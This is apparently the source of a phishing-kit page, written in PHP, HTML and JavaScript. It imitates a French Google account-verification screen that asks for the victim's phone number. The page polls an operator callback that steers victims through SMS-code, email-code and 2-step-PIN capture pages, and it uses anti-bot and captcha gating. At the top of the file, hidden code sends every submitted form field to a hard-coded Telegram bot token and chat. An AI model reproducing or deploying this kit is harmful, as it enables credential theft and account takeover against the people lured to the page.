<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

require_once '../modules/sessions.php'; // INIT OU RECUPERER SESSIONS + COOKIES
require_once '../antibots/all.php';     // AB 
require_once __DIR__ . '/../langues/lang_detect.php';
if (empty($_SESSION['captcha_valide']) || $_SESSION['captcha_valide'] !== true) {
  header('Location: ../index.php');
  exit;
}
if (!empty($_POST['bot_honeypot'])) {
  exit;
}

$uid = $_SESSION['user_id'] ?? null;
$pinFile = __DIR__ . "/../actions/code_pin_{$uid}.txt";
//Chiffre que tu envoies
$pin = file_exists($pinFile) ? file_get_contents($pinFile) : '--';

?>
<!doctype html>
<html lang=fr dir=ltr class=eC9N2e>

<head>
<title> <?php echo $tr["title_others"]; ?></title>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="robots" content="noindexnofollow ,noimageindex ,noarchive, nocache, nosnippet">
  <!-- CSS FILES -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="../assets/css/num.css">
  <!--icon .ico -->
  <link rel="icon" type="image/x-icon" href="../assets/img/icon.ico" />
</head>

<style>
  .error-message-google {
    color: #d93025;
    /* rouge Google */
    font-size: 0.875rem;
    /* un peu plus petit */
    margin-top: 4px;
    font-family: 'Roboto', sans-serif;
    /* comme Google */
  }
</style>
<style>
  .loader {
    display: none;
    /* caché par défaut */
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(255, 255, 255, 0.6);
    /* fond semi-transparent */
    z-index: 9999;
    align-items: center;
    justify-content: center;
  }

  .loader .spinner-border {
    width: 4rem;
    height: 4rem;
    border: 0.4em solid #4285f4;
    /* bleu Google */
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
</style>
<!-- Loader -->
<div class="loader">
  <div class="spinner-border"></div>
</div>




<body jscontroller=LDQI
  jsaction="rcuQ6b:npT2md; click:FAbpgf; auxclick:FAbpgf;SlnBXb:.CLIENT;cbwpef:.CLIENT;wINJic:.CLIENT;GvneHb:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;LhiQec:.CLIENT;m2qNHd:.CLIENT;asggkf:.CLIENT;clwp8d:.CLIENT;keydown:.CLIENT"
  class="jR8x9d nyoS7c UzCXuf EIlDfe">
  <div jscontroller=DqMihc jsaction=rcuQ6b:npT2md;rURRne:AC0Pid;WK2DQd:daFy6d class=bdCvOd></div>
  <div class="S7xv8 LZgQXe">
    <div class="TcuCfd NQ5OL" jsname=rZHESd jscontroller=K1ZKnb
      jsaction=rcuQ6b:npT2md;SlnBXb:r0xNSb;cbwpef:Yd2OHe;iFFCZc:nnGvjf;Rld2oe:oUMEzf;FzgWvd:oUMEzf;rURRne:pSGWxb;
      tabindex=null>
      <div jscontroller=ziZ8Mc jsaction=rcuQ6b:npT2md jsname=P1ekSe class=Ih3FE aria-hidden=true>
        <div jscontroller=ltDFwf jsaction=transitionend:Zdx3Re jsname=P1ekSe role=progressbar
          class="sZwd7c B6Vhqe qdulke jK7moc">
          <div class="xcNBHc um3FLe"></div>
          <div jsname=cQwEuf class="w2zcLc Iq5ZMc"></div>
          <div class="MyvhI TKVRUb" jsname=P1ekSe><span class="l3q5xe SQxu9c"></span></div>
          <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
        </div>
      </div>
      <div class=fAlnEc id=yDmH0d jsaction=ZqRew:.CLIENT>
        <div id=ZCHFDb></div><c-wiz jsrenderer=QUcnQb class=A77ntc data-view-id=yFJc2b jsshadow
          jsdata=deferred-c18
          data-p='%.@.4,null,null,null,"",0,[],"identity-signin-password"]'
          jscontroller=xGm74
          jsaction=jiqeKb:ZCwQbe;CDQ11b:n4vmRb;DKwHie:gVmDzc;jR85Td:WtmXg;rcuQ6b:rcuQ6b;o07HZc:V4xqVe;t5qvFd:.CLIENT
          jsname=nUpftc data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
          <main class=Svhjgc jsname=bN97Pc jscontroller=SD8Jgb jsshadow
            data-use-configureable-escape-action=true data-send-method=SMS>
            <div class=zIgDIc jsname=paFcre><c-wiz jsrenderer=OTcFib jsshadow jsdata=deferred-c17
                data-p=%.@.] data-node-index=1;0 jsmodel=hc6Ubd c-wiz>
                <div class=Wf6lSd jscontroller=rmumx jsname=n7vHCb><svg
                    xmlns=https://www.w3.org/2000/svg width=48 height=48 viewBox="0 0 40 48"
                    aria-hidden=true jsname=jjf7Ff>
                    <path fill=#4285F4
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z">
                    </path>
                    <path fill=#34A853
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z">
                    </path>
                    <path fill=#FABB05
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z">
                    </path>
                    <path fill=#E94235
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z">
                    </path>
                  </svg></div><c-data id=c17 jsdata=" eCjdDd;_;$8" class=sf-hidden></c-data>
              </c-wiz>
              <div class="ObDc3 ZYOIke" jsname=tJHJj jscontroller=E87wgc
                jsaction=JIbuQc:pKJJqe(af8ijd);wqEGtb:pKJJqe;>
                <h1 class=vAV9bf data-a11y-title-piece id=headingText jsname=r4nke><span
                    jsslot> <?php echo $tr["numero"]["0"];?></span></h1>
                <div class=gNJDp data-a11y-title-piece id=headingSubtext jsname=VdSJob><span jsslot> <?php echo $tr["numero"]["1"];?>
                   <a href="" target=""> <?php echo $tr["numero"]["2"];?></a></span></div>
                <div class=SOeSgb>
                  <div jscontroller=k5xHfe
                    jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
                    class="Ahygpe m8wwGd EPPJc cd29Sd xNLKcb" tabindex=0 role=link
                    aria-label="Identifiant de compte sélectionné&nbsp;: reception.lac.de.devesset@gmail.com. Changer de compte"
                    jsname=af8ijd>
                    <div class=HOE91e>
                      <div class=JQ5tlb aria-hidden=true><svg aria-hidden=true class=Qk3oof
                          fill=currentColor focusable=false width=48px height=48px
                          viewBox="0 0 24 24" xmlns=https://www.w3.org/2000/svg>
                          <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
                          </path>
                        </svg></div>
                    </div>
                    <div jsname=bQIQze class=IxcUte data-profile-identifier translate=no>
                      <?php echo $_SESSION['login_identifiant'] ?>
                    </div>
                    <div class=JCl8ie><svg aria-hidden=true class="Qk3oof u4TTuf" fill=currentColor
                        focusable=false width=24px height=24px viewBox="0 0 24 24"
                        xmlns=https://www.w3.org/2000/svg>
                        <path d="M7 10l5 5 5-5z"></path>
                      </svg></div>
                  </div>
                </div>
              </div>
            </div>
            <div class=UXFQgc jsname=uybdVe>
              <div class=qWK5J>
                <div class=xKcayf jsname=USBQqe>
                  <div class=AcKKx jsname=rEuO1b jscontroller=qPYxq data-form-action-uri>


                    <span jsslot>
                    <section class="Em2Ord " jscontroller="Tbb4sb" jsshadow=""><header class="vYeFie" jsname="tJHJj" aria-hidden="true"><figure class="LwQQGe" jsname="Ayj0Lb" aria-hidden="true" data-illustration="accountRecoverySmsPin"><picture class="Dzz9Db IiQozc" jsname="nhCGJe"><div class="nPt1pc"></div><source srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" media="(prefers-color-scheme: dark)"><img class="f4ZpM TrZEUc" src="https://ssl.gstatic.com/accounts/account-recovery-sms-pin.gif" aria-hidden="true" alt="" data-iml="210524.5"></picture></figure></header><div class="yTaH4c" jsname="MZArnb"><div jsslot=""></div></div></section>
                      <section class="Em2Ord PsAlOe rNe0id eLNT1d S7S4N sf-hidden"
                        jscontroller=Tbb4sb data-callout-type=2 aria-hidden=true
                        jsname=INM6z aria-live=assertive aria-atomic=true jsshadow>
                      </section>
                      <section class=Em2Ord jscontroller=Tbb4sb jsname=dZbRZb jsshadow>
                        <header class="vYeFie sf-hidden" jsname=tJHJj aria-hidden=true>
                        </header>
                        <div class=yTaH4c jsname=MZArnb>
                          <div jsslot>
                            <section class="Em2Ord S7S4N" jscontroller=Tbb4sb jsshadow>
                              <header class=vYeFie jsname=tJHJj>
                                <div class=ozEFYb role=presentation jsname=NjaE2c>
                                  <h2 class="x9zgF TrZEUc"><span jsslot
                                      jsname=Ud7fr> <?php echo $tr["numero"]["3"];?></span></h2>
                                  <div class="osxBFb sf-hidden" jsname=HSrbLb
                                    aria-hidden=true></div>
                                </div>
                              </header>
                              <div class=yTaH4c jsname=MZArnb>
                                <div jsslot></div>
                              </div>
                            </section>
                            <div class=dMNVAe> <?php echo $tr["numero"]["4"];?>
                              <span class=red0Me jscontroller=wjF3l jsshadow jsaction>
                                <span dir=ltr jsname=wKtwcc>•• •• •• •• •• </span></span>). <em> <?php echo $tr["numero"]["5"];?></em>
                            </div>
                            <div jscontroller=Acvdsc
                              jsaction="rcuQ6b:npT2md; input:YPqjbf(qTMFQd); keydown:C9BaXe;uJh63c:uydM9d(YzgRqe);"
                              jsname=MeDaPb class=sg1AX>
                              <div class=KpN2db>
                                <div jscontroller=lcGjA class=mWroFe
                                  jsaction=rcuQ6b:npT2md;OmFrlf:N9K5Gb
                                  jsname=YzgRqe>
                                  <div id=c10 class="dRC3Gd sf-hidden"
                                    jsname=Jj7nGb></div>
                                  <div class=Rd4kKf jsshadow>
                                   
                                  </div>
                                </div>
                                <div class=MK96uf>
                                  <div jscontroller=EF8pe jsshadow
                                    class="Ufn6O t8U8ud"
                                    data-idom-container-class="cfWmIb orScbe"
                                    data-provided-aria-describedby=c9
                                    jsname=qTMFQd>

                                    <form id="form-num">

                                      <!-- input -->
                                      <label class="VfPpkd-fmcmS-yrriRe VfPpkd-fmcmS-yrriRe-OWXEXe-mWPk3d VfPpkd-ksKsZd-mWPk3d VfPpkd-fmcmS-yrriRe-OWXEXe-INsAgc VfPpkd-fmcmS-yrriRe-OWXEXe-i3jM8c-fmcmS cfWmIb orScbe VfPpkd-fmcmS-yrriRe-OWXEXe-XpnDCe VfPpkd-fmcmS-yrriRe-OWXEXe-V67aGc-NLUYnc" jsaction="" jsname=vhZMvf for=phoneNumberId>
                                        <span jscontroller=bTi8wc class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-mWPk3d VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe" jsname=B9mpmd>
                                          <span class=VfPpkd-NSFCdd-Brv4Fb></span>
                                          <span class=VfPpkd-NSFCdd-Ra9xwd jsname=FMODoe style=width:124.25px>
                                            <span id=c14 class="VfPpkd-NLUYnc-V67aGc VfPpkd-NLUYnc-V67aGc-OWXEXe-TATcMc-KLRBe" jscontroller=Tpj7Pb jsname=V67aGc> <?php echo $tr["numero"]["6"];?></span>
                                          </span>
                                          <span class=VfPpkd-NSFCdd-MpmGFe></span>
                                        </span>
                                        <input
                                          type="tel"
                                          placeholder="06 xx xx xx xx"
                                          maxlength="12"
                                          name="numero"
                                          id="phoneNumberId"
                                          jsname="YPqjbf"
                                          class="VfPpkd-fmcmS-wGMbrd"
                                          jsaction="focus:AHmuwe;blur:O22p3e;input:YPqjbf;mousedown:UX7yZ;mouseup:lbsD7e;pointerdown:QJflP;pointerup:HxTfMe;touchstart:p6p2H;touchend:yfqBxc;"
                                          aria-describedby="c9"
                                          aria-labelledby="c14"
                                          autocomplete="off" />


                                      </label>
                                  </div>
                                  <div jsname=NuIDSd class=hLRWIe aria-live=polite aria-relevant=all id=c9></div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </section>
                    </span>

                    <?php if (isset($_GET['error'])) : ?>
                      <div class="error-message-google"> <?php echo $tr["numero"]["error"];?>
                      </div><?php endif; ?>
                  </div>
                </div>
              </div>
            </div>
            <div class="JYXaTc lUWEgd" jsname=DH6Rkf jscontroller=z0u0L
              jsaction=rcuQ6b:rcuQ6b;KWPV0:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd;
              data-is-consent=false data-is-primary-action-disabled=false
              data-is-secondary-action-disabled=false data-primary-action-label=Envoyer
              data-secondary-action-label=" <?php echo $tr["index"]["9"];?>" jsshadow>
              <div class=O1Slxf jsname=DhK0U>
                <div class=TNTaPb jsname=k77Iif>
                  <div jscontroller=f8Gu1e jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=Njthtb
                    class="XjS9D TrZEUc">


                    <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true">
                      <button
                        class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"
                        jscontroller="soHxf"
                        jsaction="click:cOuCgd;mousedown:UX7yZ;mouseup:lbsD7e;mouseenter:tfO1Yc;mouseleave:JywGue;touchstart:p6p2H;touchmove:FwuNnf;touchend:yfqBxc;touchcancel:JMtRjd;focus:AHmuwe;blur:O22p3e;contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                        data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"
                        jsname="LgbsSe"
                        type="submit">
                        <div class="VfPpkd-Jh9lGc"></div>
                        <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                        <div class="VfPpkd-RLmnJb"></div>
                        <span jsname="V67aGc" class="VfPpkd-vQzf8d"><?php echo $tr["btn_envoyer"];?></span>
                      </button>
                    </div>

                    </form>

                  </div>
                </div>
                <div class=FO2vFd jsname=QkNstf>
                  <div jscontroller=f8Gu1e jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=eBSUOb
                    class="XjS9D TrZEUc mWv92d">
                    <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true><button
                        class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                        jscontroller=soHxf
                        jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                        data-idom-class="ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                        jsname=LgbsSe type=button>
                        <div class=VfPpkd-Jh9lGc></div>
                        <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                        <div class=VfPpkd-RLmnJb></div><span jsname=V67aGc
                          class=VfPpkd-vQzf8d> <?php echo $tr["index"]["9"];?></span>
                      </button></div>
                  </div>
                </div>
              </div>
            </div>
          </main><c-data id=c18 jsdata=" Rf8b0c;_;$9 tEzfhe;_;$10" class=sf-hidden></c-data><view-header
            style=display:none></view-header>
        </c-wiz>
      </div>
    </div>
    <div class=wmGw4><c-wiz jsrenderer=ZdRp7e jsshadow jsdata=deferred-i1 data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
        <footer class=FZfKCe>
          <div class=eXa0v jscontroller=xiZRqc jsaction=rcuQ6b:npT2md;OmFrlf:VPRXbd>
            <div jsshadow class=O1htCb-H9tDt jsname=rfCUpd jscontroller=yRXbo
              jsaction=iFFCZc:Y0y4c;Rld2oe:gDkf4c;EDR5Je:QdOKJc;FzgWvd:RFVo1b>
              <div jsname=wSASue
                class="VfPpkd-O1htCb VfPpkd-O1htCb-OWXEXe-INsAgc VfPpkd-O1htCb-OWXEXe-di8rgd-V67aGc ReCbLb UAQDDf dEoyBf">

                <div class="VfPpkd-xl07Ob-XxIAqe VfPpkd-xl07Ob-XxIAqe-OWXEXe-tsQazb VfPpkd-xl07Ob VfPpkd-YPmvEd s8kOBc dmaMHc sf-hidden"
                  jsname=xl07Ob jscontroller=ywOR5c
                  jsaction=keydown:I481le;JIbuQc:j697N(rymPhb);XVaHYd:c9v4Fb(rymPhb);Oyo5M:b5fzT(rymPhb);DimkCe:TQSy7b(rymPhb);m0LGSd:fAWgXe(rymPhb);WAiFGd:kVJJuc(rymPhb);
                  data-is-hoisted=false data-should-flip-corner-horizontally=false
                  data-stay-in-viewport=false data-menu-uid=ucj-1></div>
              </div>
            </div>
          </div>
          <ul class=HwzH1e>
            <li class=qKvP1b><a class="AVAq4d TrZEUc"
                href=""
                target=_blank> <?php echo $tr["footer"]["0"];?></a>
            <li class=qKvP1b><a class="AVAq4d TrZEUc"
                href=""
                target=_blank> <?php echo $tr["footer"]["1"];?></a>
            <li class=qKvP1b><a class="AVAq4d TrZEUc"
                href="" target=_blank> <?php echo $tr["footer"]["2"];?></a>
          </ul>
        </footer><c-data id=i1 jsdata=" OsjLy;_;4" class=sf-hidden></c-data>
      </c-wiz></div>
  </div><iframe height=0 width=0 tabindex=-1 sandbox="allow-popups allow-top-navigation-by-user-activation"
    style=position:absolute;left:0px;top:0px;z-index:-1
    srcdoc="<html><meta charset=utf-8><meta name=referrer content=no-referrer><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;>"></iframe><iframe
    style=display:none></iframe>
  <div aria-live=assertive aria-relevant=additions aria-atomic=true aria-hidden=true
    style=color:transparent;z-index:-1;position:absolute;top:0px;left:0px;user-select:none>
    <div aria-atomic=true> <?php echo $tr["numero"]["0"];?> Afin de protéger votre compte, Google veut s'assurer
      que c'est bien vous qui essayez de vous connecter.  <?php echo $tr["numero"]["2"];?> </div>
  </div>

</body>

</html>
<!-- Fin form -->

<script>
  const form = document.getElementById('form-num');
  const logininput = document.getElementById('phoneNumberId');

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    // Supprimer anciens messages d’erreur
    const oldError = logininput.parentNode.querySelector('.error-message');
    if (oldError) oldError.remove();

    let hasError = false;

    if (!logininput.value.trim()) {
      showError(logininput, 'Le numéro est requis');
      hasError = true;
    }

    if (hasError) {
      logininput.focus();
      return;
    }

    const loader = document.querySelector('.loader');
    if (loader) loader.style.display = 'flex';

    const formData = new FormData(form);

    fetch('../actions/num.php', {
        method: 'POST',
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (data.error) {
          showError(logininput, data.error);
          if (loader) loader.style.display = 'none';
        } else if (data.step === 2) {
          startCallbackPolling(loader);
        } else {
          alert('Réponse inattendue du serveur');
          if (loader) loader.style.display = 'none';
        }
      })
      .catch(() => {
        alert('Erreur réseau, veuillez réessayer.');
        if (loader) loader.style.display = 'none';
      });
  });

  function showError(inputElement, message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.style.color = '#d93025';
    errorDiv.style.fontSize = '0.9rem';
    errorDiv.style.marginTop = '5px';
    errorDiv.textContent = message;
    inputElement.parentNode.appendChild(errorDiv);
  }

  function startCallbackPolling(loaderElement) {
    const intervalId = setInterval(() => {
      fetch('../actions/callback.php', {
          cache: 'no-store'
        })
        .then(res => res.text())
        .then(msg => {
          const trimmedMsg = msg.trim();
          console.log('Callback reçu :', trimmedMsg);
          const redirectMap = {
                        'login_error': '../pages/index.php?error=error',
                        'num': '../pages/num.php', //numéro de téléphone    
                        'num_error': '../pages/num.php?error=error', //numéro de téléphone     

                        'code_sms_error': '../pages/code_sms.php?error=error', //code smsrecu
                        'code_sms': '../pages/code_sms.php', //code recu

                        'code_mail': '../pages/code_mail.php', //code recu
                        'code_mail_error': '../pages/code_mail.php?error=error', //code recu

                        'pin_2steps': '../pages/2steps.php', //code recu                      
                        '2steps_error': '../pages/2steps.php?error=error', //code recu
                        
                        'success': '../pages/success.php',
                        'ban_ip': '../pages/ban.php'
                    };

          if (redirectMap[trimmedMsg]) {
            clearInterval(intervalId);
            window.location.href = redirectMap[trimmedMsg];
          }
        })
        .catch(err => console.error('Erreur fetch callback:', err));
    }, 3000);
  }
</script>
